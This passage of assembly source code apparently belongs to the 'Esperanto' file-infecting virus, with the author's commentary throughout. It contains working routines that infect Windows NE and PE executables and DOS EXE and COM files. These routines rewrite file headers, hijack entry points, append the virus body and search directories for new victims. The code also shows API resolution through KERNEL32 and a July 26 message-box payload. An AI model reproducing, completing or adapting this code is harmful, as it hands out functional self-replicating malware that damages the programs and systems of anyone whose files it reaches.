                mov     ax,word ptr ds:[si+22h]     ; Distance to seg.table
                mov     dx,8                        ; Value we have to add
                cmp     word ptr ds:[si+4],ax       ; to the pointers which
                jb      first_ok                    ; are equal to AX

                add     word ptr ds:[si+4],dx       ; Update first pointer
first_ok:       mov     cx,4                        ; 4 pointers to update
                push    si                          ; Push SI onto stack
                add     si,24h                      ; Now go for the rest

update_ptrs:    cmp     word ptr ds:[si],ax         ; Pointer below AX?
                jb      dont_add                    ; Don't add 8 to it

                add     word ptr ds:[si],dx         ; Update the pointer
dont_add:       inc     si                          ; I know i could have
                inc     si                          ; optimized this, but
                loop    update_ptrs                 ; who cares :P
                pop     si                          ; Pop SI from stack

                mov     ax,word ptr ds:[si+1ch]     ; AX -> segment counter
                inc     word ptr ds:[si+1ch]        ; Increment counter

                mov     cx,dx                       ; CX = DX = 8
                cwd                                 ; Now set DX to 0
                mov     byte ptr ds:[si+37h],dl     ; EXE flags = 0
                mov     word ptr ds:[si+38h],dx     ; Kill gangload area
                mov     word ptr ds:[si+3ah],dx     ; for compatibility
                mul     cx                          ; Multiply AX*CX

                add     ax,word ptr ds:[si+22h]     ; Ptr to segment table
                mov     cx,200h                     ; CX -> page size
                adc     dx,0                        ; Add with carry to DX
                div     cx                          ; Divide the length

                mov     word ptr ds:[di+3],ax       ; Move to newexe_size
                mov     word ptr ds:[di+5],dx       ; Move to last_newexe

                mov     ax,offset newexe_entry      ; Offset of the NE entry
                xchg    ax,word ptr ds:[si+14h]     ; Exchange the values
                mov     word ptr ds:[old_ne_ip],ax  ; Store old NE IP

                mov     ax,word ptr ds:[si+1ch]     ; Nr.of segments in NE
                xchg    ax,word ptr ds:[si+16h]     ; Exchange the values
                mov     word ptr ds:[old_ne_cs],ax  ; Store old NE CS

                mov     al,byte ptr ds:[si+32h]     ; Get file alignment
                mov     byte ptr ds:[di+2],al       ; shift count in AL

                mov     ax,word ptr ds:[di]         ; Offset of NE header
                mov     word ptr ds:[di+7],ax       ; in AX and lseek_newexe

move_forward:   mov     ax,word ptr ds:[di+3]       ; Get newexe_size value
                or      ax,ax                       ; in AX and check if it
                jz      last_page                   ; is equal to zero

                dec     word ptr ds:[di+3]          ; Decrement newexe_size
                mov     dx,word ptr ds:[di+7]       ; Now lseek to [3ch]-8
                sub     dx,8                        ; in order to shift the
                call    lseek_middle                ; required objects

                mov     ah,40h                      ; Write one page which
                mov     cx,200h                     ; contains the NE header
                add     word ptr ds:[di+7],cx       ; in [3ch]-8 in order to
                mov     dx,si                       ; shift the 1st object
                int     21h

                push    cx                          ; CX -> one page size
                mov     dx,word ptr ds:[di+7]       ; Now lseek to the end
                call    lseek_middle                ; of the *new* NE header

                mov     ah,3fh                      ; Read a new page from
                pop     cx                          ; current offset to our
                mov     dx,si                       ; buffer, pointed both
                int     21h                         ; by DS:DX and DS:SI

                jmp     move_forward                ; And go shift it
last_page:      call    lseek_end                   ; Lseek to the bottom

                mov     cl,byte ptr ds:[di+2]       ; Get align_shift in CL
                push    bx                          ; Push file handle
                mov     bx,1                        ; And now shift segment
                shl     bx,cl                       ; offset by segment
                mov     cx,bx                       ; alignment (shl -> CX)
                pop     bx                          ; Pop file handle
                div     cx                          ; And divide AX:CX

                mov     word ptr ds:[di+9],0        ; Set lseek_add = 0
                or      dx,dx                       ; Is DX also zero?
                jz      no_extra                    ; Yes, no extra page

                sub     cx,dx                       ; Substract DX from CX
                mov     word ptr ds:[di+9],cx       ; Move it to lseek_add
                inc     ax                          ; And increment AX

no_extra:       push    di                           ; Push DI onto stack
                mov     di,si                        ; Now DS:SI = DS:DI
                add     di,word ptr ds:[last_newexe] ; DS:DI+last_newexe

                mov     word ptr ds:[di],ax               ; Segment offset
                mov     word ptr ds:[di+2],espo_file_size ; Segment size
                mov     word ptr ds:[di+4],180h           ; Segment attribs
                mov     word ptr ds:[di+6],espo_file_size+400h ; Bytes to
                pop     di                                     ; allocate

                mov     dx,word ptr ds:[di+7]       ; Lseek to the offset
                sub     dx,8                        ; where we have to
                call    lseek_middle                ; write this last page

                mov     ah,40h                      ; Write it in, its
                mov     cx,word ptr ds:[di+5]       ; size is specified
                add     cx,8                        ; in (last_newexe)+8
                mov     dx,si                       ; Point to the buffer
                int     21h                         ; And do it :P

                xor     cx,cx                       ; Set the NewEXE IP
                xchg    word ptr ds:[newexe_ip],cx  ; to zero, exchange it
                push    cx                          ; and push old value
                xor     cx,cx                       ; And now set the
                dec     cx                          ; NewEXE CS to 0ffffh
                xchg    word ptr ds:[newexe_cs],cx  ; Exchange the values
                push    cx                          ; And push it for l8r

                mov     ax,4202h                    ; Lseek to our final
                xor     cx,cx                       ; destination place
                mov     dx,word ptr ds:[di+9]       ; in the NewEXE file
                int     21h

                mov     ah,40h                      ; And append our virus
                mov     cx,espo_file_size           ; body to it... now
                lea     dx,espo_start               ; it has grown 4733
                int     21h                         ; charming bytes :P

                pop     word ptr ds:[newexe_cs]     ; Restore relocation
                pop     word ptr ds:[newexe_ip]     ; pointers for CS:IP

                mov     ah,40h                      ; And write the cool
                mov     cx,reloc_size               ; relocation item :)
                lea     dx,reloc_start              ; Now the file is
                int     21h                         ; 4743 bytes bigger!
                jmp     go_away                     ; Close it and exit

; ÄÄ´ PE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_pe:       call    lseek_start                 ; Lseek to the start
                mov     ah,3fh                      ; of the file and
                mov     cx,41h                      ; read again the first
                mov     dx,si                       ; 41h bytes of the MZ
                int     21h                         ; header to rebuild it

                call    lseek_start                 ; Lseek to start again
                add     word ptr ds:[si+MZ_lfanew],8 ; Update the pointer
                mov     ah,40h                      ; to the new EXE header
                mov     cx,40h                      ; by readding 8 to it
                mov     dx,si                       ; and write the MZ
                int     21h                         ; header back

                mov     dx,word ptr ds:[di]         ; Now lseek to the
                call    lseek_middle                ; PE header (in [3ch])

                mov     ah,3fh                      ; Read one page from
                mov     cx,200h                     ; it to our buffer
                mov     dx,si                       ; and point it both
                int     21h                         ; with DS:DX and DS:SI

                mov     bp,si                       ; Also DS:SI = DS:BP
                lodsd                               ; First doubleword

                mov     ax,word ptr ds:[si+FH_Characteristics]
                test    ax,IMAGE_FILE_EXECUTABLE_IMAGE
                jz      go_away
                                                    ; We don't want neither
                test    ax,IMAGE_FILE_DLL           ; DLLs nor non-exec PE
                jnz     go_away                     ; files, just skip them

                ; Get number of sections of the PE file
                ; and then point the first section with EDI

                movzx   ecx,word ptr [si+FH_NumberOfSections]
                movzx   edi,word ptr [si+FH_SizeOfOptionalHeader]
                add     si,IMAGE_SIZEOF_FILE_HEADER
                add     edi,esi

s_image_sect:   mov     eax,dword ptr ds:[si+OH_DataDirectory\
                                            .DE_Import\
                                            .DD_VirtualAddress]
                mov     edx,dword ptr ds:[di+SH_VirtualAddress]
                sub     eax,edx

                ; Now we're looking for the section in which
                ; the import table is found. This is usually
                ; the .idata section, but we make sure by
                ; means of checking if the address of the
                ; imports directory is inside this section

                cmp     eax,dword ptr ds:[di+SH_VirtualSize]
                jb      section_is_ok

                ; In case it's not, we point to the header
                ; of the next section with EDI, and keep on
                ; doing the same until we find it

                add     di,IMAGE_SIZEOF_SECTION_HEADER
                loop    s_image_sect
                jmp     go_away

                ; Now get a pointer to the first import
                ; module descriptor in EAX so we may
                ; look for KERNEL32.DLL thru this array

section_is_ok:  add     eax,dword ptr ds:[di+SH_PointerToRawData]
                mov     dword ptr ds:[rawdata_ptr],eax
                sub     edx,eax
                push    edx

                ; Get absolute address to this array
                ; in EDX and lseek to it in order to
                ; read 4096 to our buffer, so we may
                ; look for the KERNEL32.DLL descriptor

                mov     edx,eax
                call    lseek_middle

                mov     ah,3fh
                mov     cx,1000h
                lea     dx,old_exe_header
                int     21h

                ; Restore EDX and point both with EAX and
                ; EBP to the array of imported modules

                pop     edx
                mov     eax,ebp

                ; Get the RVA of the Import Module
                ; Descriptor in ESI and later check
                ; if it actually exists or not (=0)

next_imd_imge:  mov     esi,dword ptr ds:[bp+ID_Name]
                lea     edi,kernel32_n
                or      esi,esi
                jz      go_away

                ; Now get the address of the name of
                ; the IMD and check if it's the one
                ; we're looking for (KERNEL32.DLL)

                push    eax ebp
                sub     esi,edx
                sub     esi,dword ptr ds:[rawdata_ptr]
                add     esi,eax
                mov     ecx,8

                ; Get a character from DS:ESI, check its
                ; case, convert it if necessary to uppercase
                ; and then compare the strings pointed by
                ; DS:ESI and DS:EDI (-> KERNEL32.DLL)

dll_lewp:       lodsb
                cmp     al,'a'
                jb      check_charct

                sub     al,('a'-'A')
check_charct:   scasb
                jne     more_imd_imge
                loop    dll_lewp

                ; Name matched, restore registers

                pop     edi
                push    es bx

                ; Get file date/time and check if it is a
                ; binded file (date 24/08/95, time 9:50)

                mov     ah,2fh
                int     21h

                cmp     dword ptr es:[bx+16h],1f184e40h
                je      go_away

                ; Don't infect it in case it is binded.
                ; Otherwise point the table of imported
                ; addresses from the current module (K32)
                ; and look for some necessary RVAs

                pop     bx es ebp
                mov     esi,dword ptr [di+ID_FirstThunk]
                sub     esi,edx
                mov     dword ptr ds:[thunk_offset],esi
                push    edx

                ; Lseek to the absolute offset and read
                ; 4096 bytes to our buffer so we may look
                ; for the RVAs of the APIs we need

                mov     edx,esi
                call    lseek_middle

                mov     ah,3fh
                mov     cx,1000h
                lea     dx,old_exe_header
                mov     si,dx
                int     21h

                ; Now let's go for GetModuleHandleA. We
                ; need the RVA of this API because it is
                ; necessary to call it in order to know
                ; the base address of KERNEL32.DLL

                pop     edx
                push    esi
                lea     edi,gmhandle_n
                call    search_name
                mov     dword ptr ds:[gmhandle_rva],eax

                ; Our next and last objective is the API
                ; GetProcAddress, which helps us in order
                ; to find the address of any API we look
                ; for of a given module or library

                pop     esi
                lea     edi,gpaddress_n
                call    search_name
                mov     dword ptr ds:[gpaddress_rva],eax
                jmp     infect_pe

                ; Go to next imported module descriptor

more_imd_imge:  pop     ebp eax
                add     ebp,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
                jmp     next_imd_imge

; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_pe:      inc     byte ptr ds:[inf_counter]   ; Increment inf.counter
                mov     si,bp                       ; SI = BP -> read buffer

                mov     dx,word ptr ds:[winexe_offset] ; Lseek to the PE
                call    lseek_middle                   ; header ([3c8h])

                mov     ah,3fh                      ; And read 4096 bytes
                mov     cx,1000h                    ; from it to our read
                mov     dx,si                       ; buffer, pointing it
                int     21h                         ; with DS:DX and DS:SI

                ; Get the RVA of the last section header in
                ; EDI. Here's where we're going to copy our
                ; code, so no new sections are needed and
                ; we're not so easily discovered in a file

                cld
                lodsd
                mov     eax,IMAGE_SIZEOF_SECTION_HEADER
                movzx   ecx,word ptr ds:[esi+FH_NumberOfSections]
                dec     ecx
                mul     ecx

                movzx   edx,word ptr ds:[esi+FH_SizeOfOptionalHeader]
                add     eax,edx
                add     esi,IMAGE_SIZEOF_FILE_HEADER
                add     eax,esi
                mov     edi,eax

                ; Now get the old entry point and store its
                ; RVA in a dynamic variable of our code we
                ; will use in order to jump back to our host

                push    dword ptr ds:[esi+OH_AddressOfEntryPoint]
                pop     dword ptr ds:[entry_rva]

                ; Get original file size and store it for
                ; later use during the PE infection process

                push    es bx
                mov     ah,2fh
                int     21h

                mov     eax,dword ptr es:[bx+1ah]
                pop     bx es

                ; Calculate new entry point by means of the
                ; original file size and our memory size, and
                ; save it as the new AddressOfEntryPoint

                push    eax
                sub     eax,dword ptr ds:[edi+SH_PointerToRawData]
                add     eax,dword ptr ds:[edi+SH_VirtualAddress]
                add     ax,offset espow32_start
                mov     dword ptr ds:[esi+OH_AddressOfEntryPoint],eax

                ; And store the RVA of the base address, not
                ; forgetting to add the dseta offset to it

                add     eax,dseta_offset
                mov     dword ptr ds:[base_address],eax

                ; Get new size of VirtualSize

                pop     eax
                add     ax,espo_file_size
                sub     eax,dword ptr ds:[edi+SH_PointerToRawData]
                push    eax
                add     ax,(espo_mem_size-espo_file_size)
                cmp     eax,dword ptr ds:[edi+SH_VirtualSize]
                jbe     virtual_ok

                mov     dword ptr ds:[edi+SH_VirtualSize],eax
virtual_ok:     pop     eax

                ; And now the new size of SizeOfRawData

                add     ax,(espo_mem_size-espo_file_size)
                mov     ecx,dword ptr ds:[esi+OH_FileAlignment]
                cdq
                div     ecx
                inc     eax
                mul     ecx
                mov     dword ptr ds:[edi+SH_SizeOfRawData],eax

                ; Set section characteristics to execute, read
                ; and write access, so Esperanto will not find
                ; any problem when performing its functioning

                or      dword ptr ds:[edi+SH_Characteristics],\
                                      IMAGE_SCN_MEM_EXECUTE or\
                                      IMAGE_SCN_MEM_READ    or\
                                      IMAGE_SCN_MEM_WRITE

                ; Update the SizeOfImage pointer

                mov     eax,dword ptr ds:[esi+OH_SizeOfImage]
                add     ax,espo_file_size
                mov     ecx,dword ptr ds:[esi+OH_FileAlignment]
                cdq
                div     ecx
                inc     eax
                mul     ecx
                mov     dword ptr ds:[esi+OH_SizeOfImage],eax

                ; Lseek to the offset of the PE header and
                ; rewrite the recently modified and updated
                ; one the infected file will use from now

                mov     dx,word ptr ds:[winexe_offset]
                call    lseek_middle

                mov     ah,40h
                mov     cx,1000h
                mov     dx,bp
                int     21h

                ; And now finally lseek to the end of the
                ; file and append our code to the PE file
                ; we've just infected - we can go away

                call    lseek_end
                mov     ah,40h
                mov     cx,espo_file_size
                lea     dx,espo_start
                int     21h
                jmp     go_away

; ÍÍ¹ Subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;
;  Note: the following subroutines are used by the DOS and Windows 3.1x mo-
;   dules, in order to perform many repeated actions such as lseeking to the
;   start or the end of a file, finding RVAs, and so on.

; ÄÄ´ Lseek to the start of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş BX => file handle
;     ş File pointer somewhere in the file
;
;  Exit:
;     ş BX => file handle
;     ş File pointer in the start of the file

lseek_start:    mov     ax,4200h                    ; Lseek function, with
                xor     cx,cx                       ; AL, CX and DX = 0,
                cwd                                 ; ie, lseek to start of
                int     21h                         ; the file in BX
                ret                                 ; And go back to code

; ÄÄ´ Lseek to the middle of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş BX => file handle
;     ş DX => seek offset
;     ş File pointer somewhere in the file
;
;  Exit:
;     ş BX => file handle
;     ş File pointer = previous DX value

lseek_middle:   mov     ax,4200h                    ; Lseek function, the
                xor     cx,cx                       ; offset where to seek
                int     21h                         ; is specified in CX
                ret                                 ; Return to our caller

; ÄÄ´ Lseek to the end of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş BX => file handle
;     ş File pointer somewhere in the file
;
;  Exit:
;     ş BX => file handle
;     ş File pointer in the end of the file

lseek_end:      mov     ax,4202h                    ; Lseek function, with
                xor     cx,cx                       ; AL=2 (from bottom),
                cwd                                 ; CX and DX equal to
                int     21h                         ; zero -> lseek to end
                ret                                 ; Return to main code

; ÄÄ´ Look for the RVA of a given API by name ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş EDX    => Section ëelta-offset
;     ş DS:ESI => Import address table for KERNEL32.DLL
;     ş DS:EDI => Given API name to look for
;     ş EBP    => Buffer start address
;
;  Exit:
;      EAX    => RVA of the given IMD, or 0 if error

search_name:    push    ds
                pop     es

                ; Look for a given API (in EDI) whose RVA we
                ; are looking for by means of the structure
                ; IMAGE_IMPORT_BY_NAME, pointed by every dword
                ; in the thunk data array. First step consists
                ; on looking for its address (DS:ESI)

                lodsd
                or      eax,eax
                jz      inp_notfound

                ; Once found, we get a pointer to the first
                ; function name of this structure, and compare
                ; it with the name of the API we look for

                push    esi edi
                sub     eax,edx
                sub     eax,dword ptr ds:[thunk_offset]
                lea     esi,dword ptr ds:[eax+ebp+2]
namebyname:     lodsb
                or      al,al
                jz      inputfound

                scasb
                je      namebyname

                pop     edi esi
                jmp     search_name

                ; In case names match, we go and get the
                ; RVA of the function we've just found in
                ; the IAT. Otherwise we keep on searching

inputfound:     pop     edi esi
                lea     eax,dword ptr ds:[esi-4]
                add     eax,dword ptr ds:[thunk_offset]
                jmp     stupid_jump

                ; I know this jump is completely stupid
                ; and non-sense, but i felt like to write
                ; such a fool thing when writing the virus
                ; and i decided to keep it :)

                db      '29A'

                ; We calculate the RVA and return it in
                ; EAX so it may be later stored in its
                ; corresponding dynamic variable

stupid_jump:    sub     eax,ebp
                add     eax,edx
                ret

                ; If we couldn't find the RVA of the API,
                ; then we return with EAX equal to zero

inp_notfound:   xor     eax,eax
                ret

; ÄÄ´ Check system conditions before infection ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş BX => handle of possible victim
;     ş Infection counter holding a value 0-3
;     ş Infection timer holding a certain value
;
;  Good exit:
;     ş AH => 2ch
;
;  Exit with error:
;     ş AH => 0
;     ş Infection counter set to 0
;     ş Infection timer updated

system_checks:  mov     ah,2ch                      ; Get system time to
                int     21h                         ; do our inf.checks

                cmp     byte ptr ds:[inf_counter],3 ; Have we already
                jb      check_time                  ; infected 3 files?

                mov     byte ptr ds:[inf_counter],al ; Yes, update the
                jmp     set_error                   ; infection counter

check_time:     cmp     byte ptr ds:[inf_timer],cl  ; Are we still in the
                jb      go_for_it                   ; same minute?

set_error:      cbw                                 ; Set AH=0
                mov     byte ptr ds:[inf_timer],cl  ; Update the timer
go_for_it:      ret                                 ; And return

; ÍÍ¹ Win32 module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                .386p                               ; Intel 80386+ PMODE
espow32_start   label   byte                        ; Define 32-bit start

first_entry:    push    eax                         ; Push for later use
pe_entry:       pushad                              ; Push all the stuff

                call    delta_offset                ; Get ëelta-offset
dseta_byte      label   byte                        ; Dseta-offset marker
delta_offset:   pop     ebp                         ; Get return address
                mov     ebx,ebp                     ; Store it in EBX
                sub     ebp,offset delta_offset     ; Get ëelta in EBP

                ; Get the base address of our host in
                ; EBX, by means of substracting its
                ; RVA, stored during the PE infection

                db      81h,0ebh
base_address    dd      offset first_entry-base_default+dseta_offset

                ; Now get the return address, ie, the
                ; original entry point of the PE file,
                ; in EAX and push it onto the stack
                ; for later use during our execution

                db      0b8h
entry_rva       dd      offset exit_process-base_default
                add     eax,ebx
                mov     dword ptr [esp+20h],eax

                ; The following step consists on getting
                ; the RVA of GetModuleHandleA in EAX, so
                ; we may get the base address of KERNEL32

                db      0b8h
gmhandle_rva    dd      offset gmhandle_a-base_default
                or      eax,eax
                jz      get_kernel32

                push    dword ptr [eax+ebx]
                pop     dword ptr [ebp+gmhandle_a]

                ; If everything has gone ok, we're now
                ; about to call the GetModuleHandle API
                ; in order to know KERNEL32's address.
                ; Otherwise we had to jump to our own
                ; routine which gets this value by means
                ; of undocumented features of Windows95
                ; (not valid for the rest of Win32!)

                lea     eax,dword ptr [ebp+kernel32_n]
                push    eax
                lea     eax,dword ptr [ebp+gmhandle_a]
                call    dword ptr [eax]
                or      eax,eax
                jz      get_kernel32
kernel_found:   mov     dword ptr [ebp+kernel32_a],eax

                ; Once we've found the base address of
                ; KERNEL32 it's necessary to use the API
                ; GetProcAddress in order to look for
                ; the addresses of the functions we need
                ; to use in our code in order to work

                db      0b8h
gpaddress_rva   dd      offset gpaddress_a-base_default
                or      eax,eax
                jz      get_gpaddress

gpadd_found:    push    dword ptr [eax+ebx]
                pop     dword ptr [ebp+gpaddress_a]

                ; Point to the start of the table of API
                ; names with ESI, and to the start of the
                ; table of API addresses with EDI, holding
                ; the number of needed API functions in
                ; ECX, and then call GetProcAddress so we
                ; may fill the table of API addresses with
                ; the current valid values for our APIs

                cld
                mov     ecx,(offset api_names_end-offset api_names)/4
                lea     esi,dword ptr [ebp+api_names]
                lea     edi,dword ptr [ebp+api_addresses]

find_more_api:  lodsd
                add     eax,ebp
                push    ecx esi edi eax
                push    dword ptr [ebp+kernel32_a]
                lea     eax,dword ptr [ebp+gpaddress_a]
                call    dword ptr [eax]

                pop     edi esi ecx
                or      eax,eax
                jz      jump_to_host

                cld
                stosd
                loop    find_more_api

; ÄÄ´ Payload checking routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                ; Now it's time to check for our activation
                ; date (july 26th, when, in 1887, the first
                ; book written in Esperanto, "Internacia
                ; Lingvo", was published), so we first use
                ; the API GetLocalTime to get the date

                lea     eax,dword ptr [ebp+time_table]
                push    eax
                lea     eax,dword ptr [ebp+glocaltime_a]
                call    dword ptr [eax]

                ; Check for july

                cmp     word ptr [ebp+system_month],7
                jne     find_first

                ; Now check for the 26th

                cmp     word ptr [ebp+system_day],1ah
                jne     find_first

                ; At this point we're sure about the fact
                ; that today is our activation date, so
                ; we call the API LoadLibraryA in order
                ; to load the USER32.DLL module (for the
                ; case our host does not load it)

                lea     eax,dword ptr [ebp+user32_n]
                push    eax
                lea     eax,dword ptr [ebp+loadlibrary_a]
                call    dword ptr [eax]
                or      eax,eax
                jz      jump_to_host

                ; Next step consists on decrypting the
                ; internal text used in the payload,
                ; which is hidden behind a stupid "not"
                ; encryption... just do it (Nike) :P

                mov     ecx,text_size
                lea     esi,dword ptr [ebp+text_start]
                mov     edi,esi
decrypt_text:   lodsb
                not     al
                stosb
                loop    decrypt_text

                ; Once this is done, it's necessary to
                ; call again GetProcAddress in order to
                ; get the address of the API MessageBoxA

                lea     esi,dword ptr [ebp+messagebox_n]
                lea     edx,dword ptr [ebp+gpaddress_a]
                push    esi eax
                call    dword ptr [edx]
                or      eax,eax
                jz      jump_to_host

                ; And now we've done almost everything
                ; in the payload... just call the API,
                ; show the text and jump to the host (no
                ; infection in Esperanto's only holiday)

                push    1000h
                lea     esi,dword ptr [ebp+virus_author]
                lea     edi,dword ptr [ebp+virus_text]
                push    esi edi 0
                call    eax
                jmp     jump_to_host

; ÄÄ´ File searching routine (FindFirstFileA-based) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                ; Look for first file in current directory
                ; by means of the API FindFirstFileA, and
                ; increment the infection counter byte

find_first:     mov     byte ptr [ebp+inf_counter],0
                lea     eax,dword ptr [ebp+finddata]
                lea     edx,dword ptr [ebp+wildcard]
                push    eax edx
                lea     eax,dword ptr [ebp+findfirst_a]
                call    dword ptr [eax]
                cmp     eax,0ffffffffh
                je      jump_to_host

; ÄÄ´ File checking routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                ; Save the handle of the found file and
                ; check for its size, just to see if it's
                ; a too small file to be infected

                mov     dword ptr [ebp+srchandle],eax
check_victim:   cmp     dword ptr [ebp+finddata+WFD_nFileSizeHigh],0
                jne     find_next

                cmp     dword ptr [ebp+finddata+WFD_nFileSizeLow],\
                                                0fffffc17h-espo_file_size
                jae     find_next

                ; The file size is ok, now let's memory-map
                ; it and do further checks about its main
                ; characteristics, to know if it's a good
                ; file to infect with our viral code

                call    open_map_file
                or      ebx,ebx
                jz      find_next

                ; First of all, check for its extension to
                ; be COM or EXE. I used a stupid waste of
                ; bytes here, but i was kinda drunk when i
                ; did it (check for a dot instead of the end
                ; of the ASCIIZ string), so i thought it was
                ; fun not to modify it... it works :)

                cld
                lea     esi,dword ptr [ebp+finddata+WFD_szFileName]
find_dot:       inc     byte ptr [ebp+max_path_size]
                cmp     byte ptr [ebp+max_path_size],0ffh
                je      unmap_n_close

                lodsb
                cmp     al,'.'
                jne     find_dot

                ; Is it a COM file?

                dec     esi
                lodsd
                cmp     eax,'MOC.'
                je      check32_com

                ; Maybe an EXE file?

                cmp     eax,'EXE.'
                jne     unmap_n_close

                ; Seems so... first check for the MZ mark
                ; as the first doubleword in the header

; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check32_exe:    cmp     word ptr [ebx],'ZM'
                jne     unmap_n_close

                ; Now check for our infection mark (";)")

                cmp     word ptr [ebx+MZ_csum],');'
                je      unmap_n_close

                ; If file has not been infected, then
                ; set the winky smiley as checksum, and
                ; check for the number of overlays

                mov     word ptr [ebx+MZ_csum],');'
                cmp     word ptr [ebx+MZ_ovno],0
                jne     unmap_n_close

                ; Don't infect PkLited EXEs

                cmp     word ptr [ebx+MZ_res+2],'KP'
                je      unmap_n_close

                ; Now check for the Windows file mark

                cmp     word ptr [ebx+MZ_lfarlc],40h
                je      check32_pe

                ; At this point we know it is a DOS EXE
                ; file... we're gonna infect it for sure

; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect32_exe:   mov     byte ptr [ebp+file_flag],'E'
                inc     byte ptr [ebp+inf_counter]
                call    unmap_close

                ; Only EXEs < 65535, because of the "div"
                ; problem referenced in the virus description
                ; which is found at the start of this file

                mov     eax,dword ptr [ebp+finddata+WFD_nFileSizeLow]
                cmp     eax,0ffffh
                jnb     unmap_n_close

                ; Remap the file with our size added

                push    eax
                add     dword ptr [ebp+finddata+WFD_nFileSizeLow],\
                                                espo_file_size
                call    open_map_file
                or      ebx,ebx
                jz      no_good

                ; Calculate the new CS by means of first
                ; getting the size header in paragraphs

                pop     eax
                push    eax
                mov     ecx,10h
                cdq
                div     ecx
                sub     ax,word ptr [ebx+MZ_cparhdr]

                ; Update new CS and store the old one

                push    ax
                xchg    word ptr [ebx+MZ_cs],ax
                mov     word ptr [ebp+exe_cs],ax
                pop     ax

                ; And now update the IP pointer, which
                ; is equal to zero, that is, the start
                ; of the virus which jumps straight to
                ; the COM and EXE entry

                push    dx
                xchg    word ptr [ebx+MZ_ip],dx
                mov     word ptr [ebp+exe_ip],dx
                pop     dx

                ; Now calculate SS and SP

                add     edx,espo_file_size+320h
                and     dl,0feh

                ; Update SS

                xchg    word ptr [ebx+MZ_ss],ax
                mov     word ptr [ebp+exe_ss],ax

                ; Update SP

                xchg    word ptr [ebx+MZ_sp],dx
                mov     word ptr [ebp+exe_sp],dx
                pop     eax

                ; Calculate the new number of bytes in last
                ; page and of pages in EXE file, and update
                ; the corresponding pointers in the MZ header

                add     eax,espo_file_size
                mov     ecx,200h
                cdq
                div     ecx
                inc     eax
                mov     word ptr [ebx+MZ_cblp],dx
                mov     word ptr [ebx+MZ_cp],ax

                ; And finally append our code to the end of
                ; the EXE file we've just infected. The MZ
                ; header will be overwritten to the old one
                ; as soon as the file is unmapped, no need
                ; to lseek to the start and write it

                cld
                mov     ecx,espo_file_size
                lea     esi,dword ptr [ebp+espo_start]
                mov     edi,dword ptr [ebp+finddata+WFD_nFileSizeLow]
                sub     edi,ecx
                add     edi,ebx
                rep     movsb
                jmp     unmap_n_close

                ; Check if the COM file has been previously
                ; infected by Esperanto (winky ";)" smiley)

; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check32_com:    cmp     word ptr [ebx+3],');'
                je      unmap_n_close

                ; If not, set the file flag, increment the
                ; infection counter and memory map the file
                ; with our size previously added

; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect32_com:   mov     byte ptr [ebp+file_flag],'C'
                inc     byte ptr [ebp+inf_counter]
                call    unmap_close
                add     dword ptr [ebp+finddata+WFD_nFileSizeLow],\
                                                espo_file_size
                call    open_map_file
                or      ebx,ebx
                jz      no_good

                ; Store old COM header in our buffer

                cld
                mov     ecx,5
                push    ecx
                mov     esi,ebx
                lea     edi,dword ptr [ebp+old_com_header]
                rep     movsb

                ; Calculate the jump to the COM and EXE
                ; entry point of the virus (once appended)
                ; and store it in the buffer of the new
                ; COM header ("0e9h,?,?,;)"). Then copy
                ; it to the first five bytes of the file

                pop     ecx
                lea     esi,dword ptr [ebp+new_com_header]
                mov     edi,ebx
                mov     eax,dword ptr [ebp+finddata+WFD_nFileSizeLow]
                sub     eax,espo_file_size
                push    eax
                sub     eax,3
                mov     word ptr [esi+1],ax
                rep     movsb

                ; And finally append the viral code to
                ; the end of the COM file, unmap it and
